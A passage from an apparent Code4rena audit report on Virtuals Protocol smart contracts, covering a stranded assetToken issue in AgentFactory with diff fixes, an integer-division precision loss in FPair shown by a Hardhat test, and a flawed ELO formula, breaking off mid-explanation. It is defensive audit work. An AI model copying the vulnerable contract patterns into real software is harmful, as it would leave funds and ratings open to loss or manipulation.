<li><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentFactory.sol#L196"><code>AgentFactory::executeApplication</code></a> would fail as there might be no new <code>assetToken</code> available inside the contract:</li>
</ol>
<pre data-index="114" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">executeApplication</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">id</span><span class="mtk1">, </span><span class="mtk12">bool</span><span class="mtk1"> </span><span class="mtk12">canStake</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">noReentrant</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// . . . Rest of the code . . .</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// C2</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">lp</span><span class="mtk1"> = </span><span class="mtk11">IAgentToken</span><span class="mtk1">(</span><span class="mtk12">token</span><span class="mtk1">).</span><span class="mtk11">liquidityPools</span><span class="mtk1">()[</span><span class="mtk7">0</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">assetToken</span><span class="mtk1">).</span><span class="mtk11">transfer</span><span class="mtk1">(</span><span class="mtk12">token</span><span class="mtk1">, </span><span class="mtk12">initialAmount</span><span class="mtk1">);          &lt;&lt;@ -- </span><span class="mtk3">// Would revert</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">IAgentToken</span><span class="mtk1">(</span><span class="mtk12">token</span><span class="mtk1">).</span><span class="mtk11">addInitialLiquidity</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">));</span></span></span></code></pre>
<ol start="3">
<li>There is no way available to recover old <code>assetToken</code> balance as the contract lacks a <code>recoverERC20</code> kind of function.</li>
<li>If there were a case where <code>assetToken</code> were available inside the contract, the <code>_createNewAgentToken</code> would use unintended <code>assetToken</code> than what it was actually proposed to:</li>
</ol>
<pre data-index="115" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">_createNewAgentToken</span><span class="mtk1">(</span><span class="mtk12">string</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">name</span><span class="mtk1">, </span><span class="mtk12">string</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">symbol</span><span class="mtk1">) </span><span class="mtk11">internal</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">instance</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">instance</span><span class="mtk1"> = </span><span class="mtk12">Clones</span><span class="mtk1">.</span><span class="mtk11">clone</span><span class="mtk1">(</span><span class="mtk12">tokenImplementation</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">IAgentToken</span><span class="mtk1">(</span><span class="mtk12">instance</span><span class="mtk1">).</span><span class="mtk11">initialize</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            [</span><span class="mtk12">_tokenAdmin</span><span class="mtk1">, </span><span class="mtk12">_uniswapRouter</span><span class="mtk1">, </span><span class="mtk12">assetToken</span><span class="mtk1">],          &lt;&lt;@ -- </span><span class="mtk3">// Initialising agent token</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">abi</span><span class="mtk1">.</span><span class="mtk11">encode</span><span class="mtk1">(</span><span class="mtk12">name</span><span class="mtk1">, </span><span class="mtk12">symbol</span><span class="mtk1">),</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_tokenSupplyParams</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_tokenTaxParams</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">allTradingTokens</span><span class="mtk1">.</span><span class="mtk11">push</span><span class="mtk1">(</span><span class="mtk12">instance</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk12">instance</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>This cannot be mitigated with current implementation as Base has a private mempool, the protocol in no capacity can guarantee that before <code>setAssetToken</code> all tokens are withdrawn by the <code>WITHDRAW_ROLE</code>.</p>
<p>Also, these issues are commonly found inside the <code>AgentFactoryV3</code> and <code>AgentFactoryV4</code> contracts.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-27"><a class="anchor before" aria-label="recommended mitigation steps 27 permalink" href="#recommended-mitigation-steps-27"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>It is recommended that instead of using a public variable of <code>assetToken</code> in function calls other than <code>proposeAgent</code>, add the asset token’s address directly inside the <code>Application</code> struct and fetch it, as these calls anyways use the <code>Application</code> struct’s mapping:</p>
<pre data-index="116" data-language="diff" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    struct Application {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        string name;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        string symbol;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        string tokenURI;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+        address tokenAddress;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        ApplicationStatus status;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        uint256 withdrawableAmount;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        address proposer;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        uint8[] cores;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        uint256 proposalEndBlock;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        uint256 virtualId;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        bytes32 tbaSalt;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        address tbaImplementation;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        uint32 daoVotingPeriod;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        uint256 daoThreshold;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>Updated <code>withdraw</code>:</p>
<pre data-index="117" data-language="diff" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    function withdraw(uint256 id) public noReentrant {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        Application storage application = _applications[id];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        require(msg.sender == application.proposer || hasRole(WITHDRAW_ROLE, msg.sender), "Not proposer");</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        require(application.status == ApplicationStatus.Active, "Application is not active");</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        require(block.number &gt; application.proposalEndBlock, "Application is not matured yet");</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        uint256 withdrawableAmount = application.withdrawableAmount;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        application.withdrawableAmount = 0;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        application.status = ApplicationStatus.Withdrawn;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk8">-        IERC20(assetToken).safeTransfer(application.proposer, withdrawableAmount);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+        IERC20(application.tokenAddress).safeTransfer(application.proposer, withdrawableAmount);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>Updated <code>executeApplication</code>:</p>
<pre data-index="118" data-language="diff" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    function executeApplication(uint256 id, bool canStake) public noReentrant {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        // . . . Rest of the code . . .</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        // C2</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        address lp = IAgentToken(token).liquidityPools()[0];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk8">-        IERC20(assetToken).transfer(token, initialAmount);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+        IERC20(application.tokenAddress).transfer(token, initialAmount);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        IAgentToken(token).addInitialLiquidity(address(this));</span></span></span></code></pre>
<p>Updated <code>_createNewAgentToken</code>:</p>
<pre data-index="119" data-language="diff" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk8">- function _createNewAgentToken(string memory name, string memory symbol) internal returns (address instance) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+ function _createNewAgentToken(string memory name, string memory symbol, address memory applicationAssetToken) internal returns (address instance) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        instance = Clones.clone(tokenImplementation);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        IAgentToken(instance).initialize(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk8">-            [_tokenAdmin, _uniswapRouter, assetToken],          </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+            [_tokenAdmin, _uniswapRouter, applicationAssetToken],          </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            abi.encode(name, symbol),</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            _tokenSupplyParams,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            _tokenTaxParams</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        allTradingTokens.push(instance);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        return instance;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>This would ensure that changing <code>assetToken</code> does not break any flow.</p>
<hr>
<h2 style="position:relative;" id="m-24-precision-loss-in-pricealast-and-priceblast"><a class="anchor before" aria-label="m 24 precision loss in pricealast and priceblast permalink" href="#m-24-precision-loss-in-pricealast-and-priceblast"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-196">[M-24] Precision loss in <code>priceALast</code> and <code>priceBLast</code></a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-592">hecker_trieu_tien</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-551">0xterrah</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-354">holtzzx</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-466">PotEater</a>, and <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-271">rayss</a></em></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/fun/FPair.sol#L103">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/fun/FPair.sol#L103</a></p>
<h3 style="position:relative;" id="finding-description-and-impact-8"><a class="anchor before" aria-label="finding description and impact 8 permalink" href="#finding-description-and-impact-8"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description and impact</h3>
<p>The price calculation functions <code>priceALast</code> and <code>priceBLast</code> use integer division (<code>/</code>) directly on the pool reserves (<code>_pool.reserve0</code>, <code>_pool.reserve1</code>). Integer division in Solidity truncates any fractional part of the result, leading to significant precision loss.	</p>
<h3 style="position:relative;" id="scenario"><a class="anchor before" aria-label="scenario permalink" href="#scenario"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Scenario</h3>
<ol>
<li>The pool has reserves <code>_pool.reserve1 = 199 * 10**18</code> and <code>_pool.reserve0 = 100 * 10**18</code>.</li>
<li>A call to <code>priceALast()</code> executes <code>_pool.reserve1 / _pool.reserve0</code> which is <code>(199 * 10**18) / (100 * 10**18)</code>.</li>
<li>Due to integer division, the result is truncated from the actual price (1.99) to <code>1</code>.</li>
<li>Alternatively, if <code>_pool.reserve1 = 99 * 10**18</code> and <code>_pool.reserve0 = 100 * 10**18</code>, the calculation <code>(99 * 10**18) / (100 * 10**18)</code> results in <code>0</code> because integer division rounds down. The same logic applies symmetrically to <code>priceBLast</code> when <code>_pool.reserve0</code> is divided by <code>_pool.reserve1</code>.	</li>
</ol>
<h3 style="position:relative;" id="recommended-mitigation-steps-28"><a class="anchor before" aria-label="recommended mitigation steps 28 permalink" href="#recommended-mitigation-steps-28"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>To fix this issue, the contract should use a fixed-point arithmetic approach. Scale the numerator by a large factor (e.g., <code>10^18</code>) before division.</p>
<h3 style="position:relative;" id="proof-of-concept-17"><a class="anchor before" aria-label="proof of concept 17 permalink" href="#proof-of-concept-17"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<pre data-index="120" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">describe("Price Calculation Precision Loss", function () {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    it("should demonstrate precision loss in priceALast function", async function () {</span></span>
<span class="grvsc-line"><span class="grvsc-source">      const { fPair, router } = await loadFixture(deployFPairFixture);</span></span>
<span class="grvsc-line"><span class="grvsc-source">      </span></span>
<span class="grvsc-line"><span class="grvsc-source">      // Scenario 1: reserve1 = 199 * 10^18, reserve0 = 100 * 10^18</span></span>
<span class="grvsc-line"><span class="grvsc-source">      // Expected price: 1.99, but due to integer division, it will be 1</span></span>
<span class="grvsc-line"><span class="grvsc-source">      const reserve0 = parseEther("100");</span></span>
<span class="grvsc-line"><span class="grvsc-source">      const reserve1 = parseEther("199");</span></span>
<span class="grvsc-line"><span class="grvsc-source">      </span></span>
<span class="grvsc-line"><span class="grvsc-source">      // Since only router can call mint, we need to impersonate it</span></span>
<span class="grvsc-line"><span class="grvsc-source">      await fPair.connect(router).mint(reserve0, reserve1);</span></span>
<span class="grvsc-line"><span class="grvsc-source">      </span></span>
<span class="grvsc-line"><span class="grvsc-source">      // Check reserves were set correctly</span></span>
<span class="grvsc-line"><span class="grvsc-source">      const [actualReserve0, actualReserve1] = await fPair.getReserves();</span></span>
<span class="grvsc-line"><span class="grvsc-source">      expect(actualReserve0).to.equal(reserve0);</span></span>
<span class="grvsc-line"><span class="grvsc-source">      expect(actualReserve1).to.equal(reserve1);</span></span>
<span class="grvsc-line"><span class="grvsc-source">      </span></span>
<span class="grvsc-line"><span class="grvsc-source">      // Check price calculation</span></span>
<span class="grvsc-line"><span class="grvsc-source">      const priceA = await fPair.priceALast();</span></span>
<span class="grvsc-line"><span class="grvsc-source">      console.log("Actual price should be 1.99, but priceALast() returns:", priceA.toString());</span></span>
<span class="grvsc-line"><span class="grvsc-source">      </span></span>
<span class="grvsc-line"><span class="grvsc-source">      // Verify the precision loss - price should be 1 instead of 1.99</span></span>
<span class="grvsc-line"><span class="grvsc-source">      expect(priceA).to.equal(1);</span></span>
<span class="grvsc-line"><span class="grvsc-source">      </span></span>
<span class="grvsc-line"><span class="grvsc-source">      // Calculate the actual price with higher precision (using JavaScript)</span></span>
<span class="grvsc-line"><span class="grvsc-source">      const actualPrice = Number(formatEther(reserve1)) / Number(formatEther(reserve0));</span></span>
<span class="grvsc-line"><span class="grvsc-source">      console.log("Actual price calculated with JavaScript:", actualPrice);</span></span>
<span class="grvsc-line"><span class="grvsc-source">      console.log("Precision loss:", actualPrice - Number(priceA));</span></span>
<span class="grvsc-line"><span class="grvsc-source">    });</span></span></code></pre>
<hr>
<h2 style="position:relative;" id="m-25-incorrect-mathematical-logic"><a class="anchor before" aria-label="m 25 incorrect mathematical logic permalink" href="#m-25-incorrect-mathematical-logic"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-233">[M-25] Incorrect mathematical logic</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-342">djshan_eden</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-258">Matin</a> and <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-706">Nexarion</a></em></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/21d5ffa77e769fa3c409b41e54656a0e3267beb5/contracts/libs/Elo.sol#L56">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/21d5ffa77e769fa3c409b41e54656a0e3267beb5/contracts/libs/Elo.sol#L56</a></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/21d5ffa77e769fa3c409b41e54656a0e3267beb5/contracts/libs/Elo.sol#L59">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/21d5ffa77e769fa3c409b41e54656a0e3267beb5/contracts/libs/Elo.sol#L59</a></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/21d5ffa77e769fa3c409b41e54656a0e3267beb5/contracts/libs/Elo.sol#L60">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/21d5ffa77e769fa3c409b41e54656a0e3267beb5/contracts/libs/Elo.sol#L60</a></p>
<h3 style="position:relative;" id="finding-description-10"><a class="anchor before" aria-label="finding description 10 permalink" href="#finding-description-10"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>There is a fundamental error in the ELO calculation formula. For example, when <code>ratingA=1000</code> and <code>ratingB=800</code>, the code calculation result deviates greatly from the standard formula. The core problem lies in the exponent processing:</p>
<p>The correct calculation should be <code>10^(ratingDiff/400)</code>, but the code incorrectly converts the exponent through <code>n = 800 ± ratingDiff</code> and the fourth square root, resulting in an incorrect powered value.</p>
<h3 style="position:relative;" id="impact-17"><a class="anchor before" aria-label="impact 17 permalink" href="#impact-17"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>All ELO rating changes are calculated incorrectly, the rating system is completely untrustworthy, and attackers can use this vulnerability to obtain abnormally high rating changes.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-29"><a class="anchor before" aria-label="recommended mitigation steps 29 permalink" href="#recommended-mitigation-steps-29"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<ol>
<li><strong>Remove offset:</strong> Handle the positive and negative rating differences directly.</li>
<li><strong>Accurate exponential calculation:</strong> Use a high-precision library (such as ABDKMath) to calculate <code>10^(ratingDiff/400)</code>.</li>
<li><strong>Avoid decomposition errors:</strong> Abandon multi-step square root decomposition and handle the raw exponential directly.</li>
</ol>
<h3 style="position:relative;" id="proof-of-concept-18"><a class="anchor before" aria-label="proof of concept 18 permalink" href="#proof-of-concept-18"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<p><strong>1. Differences between the original formula and the code implementation​:</strong></p>
<p>Correct formula - the expected ELO score is:</p>
<pre data-index="121" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">ratingDiff = _negative ? ratingA - ratingB : ratingB - ratingA</span></span>
<span class="grvsc-line"><span class="grvsc-source">expected score = 1 / (1 + 10 ^ (ratingDiff / 400))</span></span></code></pre>
<p>Code error steps - the contract attempts to optimize the calculation by factoring the exponent, but introduces a fatal error:</p>
<pre data-index="122" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">n = _negative ? 800 - ratingDiff: 800 + ratingDiff;</span></span>
<span class="grvsc-line"><span class="grvsc-source">_powered = fp.rpow(10, n / 25, 1); // calculate10^(n/25)</span></span>
<span class="grvsc-line"><span class="grvsc-source">powered = sixteenthRoot(_powered); // The fourth square root → is equivalent to10^(n/(25 * 16)) = 10^(n/400)</span></span></code></pre>
<p>On the surface, the math is equivalent to <code>10^(ratingDiff/400)</code>, but the ​​offset of 800​​ completely breaks the logic.</p>
<p><strong>2. Sign error caused by offset</strong></p>
<p>Example analysis - Assume that <code>RA=1000</code>, <code>RB=800</code>, then:</p>
<p>Correct case -  The exponent is <code>(1000−800)/400=0.5</code>, and the denominator is <code>1+10^0.5≈4.1623</code>.</p>
<p>Code calculation​​:</p>
